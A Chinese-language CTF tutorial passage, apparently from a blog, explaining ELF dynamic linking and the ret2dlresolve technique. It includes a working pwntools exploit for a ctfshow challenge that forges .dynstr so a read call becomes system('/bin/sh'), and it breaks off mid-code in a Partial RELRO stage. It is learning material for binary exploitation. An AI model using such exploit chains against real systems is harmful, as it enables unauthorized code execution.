c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name;    <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">    Elf32_Addr st_value;   <span class="comment">// Symbol value</span></span><br><span class="line">    Elf32_Word st_size;    <span class="comment">// Symbol size</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other;<span class="comment">// Symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">    Elf32_Section st_shndx;<span class="comment">// Section index</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//符号名称在字符串表中的索引。通过这个索引可以从字符串表中找到符号的名称。</span></span><br><span class="line"><span class="comment">//符号值,对于函数，通常是函数的地址；对于变量，通常是变量的地址。</span></span><br><span class="line"><span class="comment">//符号的大小。例如，函数的指令长度或变量占用的字节数。</span></span><br><span class="line"><span class="comment">//符号的类型和绑定属性。它的值由两个部分组成：符号类型（低4位）和符号绑定（高4位）。</span></span><br><span class="line"><span class="comment">//符号的可见性属性。在 glibc &gt;= 2.2 的系统中，用于控制符号的可见性（例如，是否可以被其他模块访问）</span></span><br><span class="line"><span class="comment">//符号所属的节区（Section）的索引。如果符号未定义或属于特殊节区，该值可能为特定的保留值（如SHN_UNDEF）。</span></span><br></pre></td></tr></table></figure><p>write的索引值为ELF32_R_SYM(0x607) &#x3D; 0x607 &gt;&gt; 8 &#x3D; 6。而Elf32_Sym[6]即保存着write的符号表信息。并且ELF32_R_TYPE(0x607) &#x3D; 7，对应<code>R_386_JUMO_SLOT</code>。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-48-52.png" alt="1"></p><p>（4）<code>.dynstr</code>节包含了动态链接的字符串(字符串数组)。这个节以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-55-39.png" alt="1"></p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_12-08-43.png" alt="1"></p><p>其中0x080481cc为.dynsym节的首地址，0x0804826c为.dynstr节的首地址，0x4c为write在字符串表中的偏移</p><p>Elf32_Sym[6]-&gt;st_name&#x3D;0x4c（.dynsym + Elf32_Sym_size * num），所以<code>.dynstr</code>加上0x4c的偏移量，就是字符串write。</p><p>（5）<code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_12-14-48.png" alt="1"></p><p>当程序执行call write@plt时，实际会跳到0x0804a01c(.got.plt–&gt;write)去执行</p><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>在linux下，二进制引用的外部符号加载方式有三种，FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在PARTIAL_RELRO和NO_RELRO的情况下，外部符号的地址延迟加载，并且，在NO_RELRO下，ELF的dynamic段可读写。</p><p>ELF中有plt表和got表，程序调用动态链接库里的函数时，call的是plt表项，plt表中放着jmp指令，jmp到对应got表中在未第一次调用被调函数时，该函数的got表中并没有存着函数的实际地址</p><p>跟进write函数跳转到其plt表中</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-01-18.png" alt="1"></p><p>跟进off_80498D4，此时还未加载入write的真实地址</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-02-56.png" alt="1"></p><p>跟进loc_80483A6，发现<code>push reloc_arg</code>然后jmp到了plt[0]处</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-05-01.png" alt="1"></p><p>跟进sub_8048350 也就是plt[0]，即<code> push linkmap</code> 以及跳转到 <code>_dl_runtime_resolve</code> 函数</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-09-42.png" alt="1"></p><p>先push了 linkmap 到栈上</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-10-28.png" alt="1"></p><p>又jmp到<code>_dl_runtime_resolve</code>函数</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-12-05.png" alt="1"></p><p>其实就是<code>_dl_runtime_resolve</code>接受两个参数，第一个是<code>link_map</code>，通过这个link_map，ld链接器可以访问到dynstr、dynamic、dynsym、rel.plt等所需要的数据地址，而第二个参数<code>reloc_arg</code>，则表明要解析的函数在符号表中是第几个，比如，在这个elf文件里，write在第21个位置，因此push 20<br>调用write后got表中也就存着write的实际地址了</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-19-52.png" alt="1"></p><p>_dl_runtime_resolve是如何工作的呢？我们查看glibc的源码</p><p>它的源码在glibc&#x2F;sysdeps&#x2F;x86_64&#x2F;dl-trampoline.h，是直接用汇编写的，我们看到，_dl_runtime_resolve简单的调用了_dl_fixup，因此，我们再去看看_dl_fixup的源码，它的源码在glibc&#x2F;elf&#x2F;dl-runtime.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> reloc_offset  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> reloc_offset reloc_arg  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">DL_FIXUP_VALUE_TYPE  </span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  </span><br><span class="line">_dl_fixup (  </span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span></span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line">    <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab  </span><br><span class="line">        = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc  </span><br><span class="line">        = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="type">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =  </span><br><span class="line">                (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                vesrsion = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中result为libc基地址   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//value为libc基地址加上要解析函数的偏移地址，也就是实际地址   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//最后将value写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只关注主要函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info(0x607)找到.dynsym中对应的条目 （.dynsym+0x10*6)</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址（.dynstr_addrs+0x4c）</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以write为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过link_map找到对应的</span><br></pre></td></tr></table></figure><p>简单来说，在解释对应函数地址是根据对应符号名字符串来解析的，如果控制了符号名字符串，那么可以在不泄露libc的情况下实现解析任何函数</p><blockquote><h3 id="rel-plt-段的结构"><a href="#rel-plt-段的结构" class="headerlink" title=".rel.plt 段的结构"></a><code>.rel.plt</code> 段的结构</h3><p><code>.rel.plt</code> 段中的每个重定位条目通常包含以下信息：</p><ul><li><strong>偏移量（Offset）</strong> ：表示在 <code>.plt</code> 段或 <code>.got.plt</code> 段中的偏移地址，用于指示需要重定位的数据位置。</li><li><strong>信息（Info）</strong> ：包含符号表索引和类型信息，用于确定重定位的目标符号（如函数名）和重定位类型。</li><li><strong>类型（Type）</strong> ：在 ELF 文件中，重定位类型用于指定重定位的操作方式。对于 <code>.rel.plt</code> 段，通常使用 <code>R_386_JMP_SLOT</code> 类型（在 32 位 x86 架构中），表示这是一个跳转槽（JMP_SLOT）重定位，用于填充 <code>.got.plt</code> 表中的地址。</li><li><strong>符号表索引（Symbol Table Index）</strong> ：用于在动态符号表（<code>.dynsym</code>）中查找对应的符号（如函数名），从而获取函数的实际地址。</li></ul></blockquote><h1 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h1><p>思路 1 - 直接控制重定位表项的相关内容<br>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 .dynstr，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p><p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p><p>思路 2 - 间接控制重定位表项的相关内容<br>既然动态链接器会从 .dynamic 节中索引到各个目标节，那如果我们可以修改动态节中的内容使得最后动态链接器解析的符号是我们想要解析的符号，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p><p>思路 3 - 伪造 link_map<br>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p><h1 id="实例分析："><a href="#实例分析：" class="headerlink" title="实例分析："></a>实例分析：</h1><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="NO-RELRO下的情况"><a href="#NO-RELRO下的情况" class="headerlink" title="NO_RELRO下的情况"></a>NO_RELRO下的情况</h3><p>ctfshow-pwn-32</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>NO_RELRO下的情况下.dynamic节是可写的我们直接修改.dynamic的strtab将其指向我们构造的.dynstr表</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-59-51.png" alt="1"></p><p>正常的.dynstr表找该表可以搜aread</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_16-02-24.png" alt="1"></p><p>将read替换为system使得在调用read时执行system</p><p>具体思路：利用read在bss段上部署新的.dynstr表，其中将read的符号的名字改为system，接着修改.dynamic的strtab将其指向bss段的新.dynstr表，传入&#x2F;bin&#x2F;sh最后调用read函数的plt[2]执行<code>system(&#39;/bin/sh&#39;)</code></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28296)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./1.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">Elf32_Dyn_strtab = <span class="number">0x08049804</span></span><br><span class="line">bss = <span class="number">0x080498E0</span></span><br><span class="line">read_plt_first = <span class="number">0x08048376</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,Elf32_Dyn_strtab+<span class="number">4</span>,<span class="number">4</span>) <span class="comment">#将动态段中的动态字符串表（dynstr）指针修改为特定位置。</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#新表中read被替换为了system</span></span><br><span class="line">rop.read(<span class="number">0</span>,bss,<span class="built_in">len</span>((dynstr)))</span><br><span class="line">rop.read(<span class="number">0</span>,bss+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">rop.raw(read_plt_first) <span class="comment">#第一次调用read时plt表跳转到的地址也就是push一个数字然后jmp到了plt[0]处,找该位置可以IDA动调，在执行被调函数前plt表上jmp的地址即为该地址</span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(bss+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line"><span class="comment">#检查构造的 ROP 链长度是否小于等于 256 字节。这是因为漏洞程序可能对输入的缓冲区大小有限制，确保 payload 不会超出限制。</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment">#如果 ROP 链长度不足 256 字节，则用 a 字符填充到 256 字节，使 payload 的大小符合预期。</span></span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p32(bss))</span><br><span class="line">io.send(dynstr)</span><br><span class="line">io.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Partial-RELRO手工伪造"><a href="#Partial-RELRO手工伪造" class="headerlink" title="Partial RELRO手工伪造"></a>Partial RELRO手工伪造</h3><p>1.控制<code>eip</code>为PLT[0]的地址，只需传递一个<code>index_arg</code>(0x20)参数<br>2.控制<code>index_arg</code>的大小，使<code>reloc</code>(base_stage+0x24)的位置落在可控地址内<br>3.伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内<br>4.伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内<br>5.伪造<code>name</code>为任意库函数，如<code>system</code></p><p>ctfshow-pwn-83</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>开启Partial RELRO后.dynamic不可写了刚刚这种做法就不太好完成了这时我们可以通过伪造重定位表项的方式来调用目标函数。</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_20-53-54.png" alt="1"></p><p>有两种方式一种是手工伪造，这种方法比较麻烦但是可以仔细理解ret2dlresolve的原理，另一种是用工具来实现攻击比较方便</p><p>题目函数和溢出点没变</p><p>为进一步理解利用原理，选择跟着wiki一步步手工伪造</p><h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步</p><ol><li>将栈迁移到 bss 段。</li><li>通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。</li></ol><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span 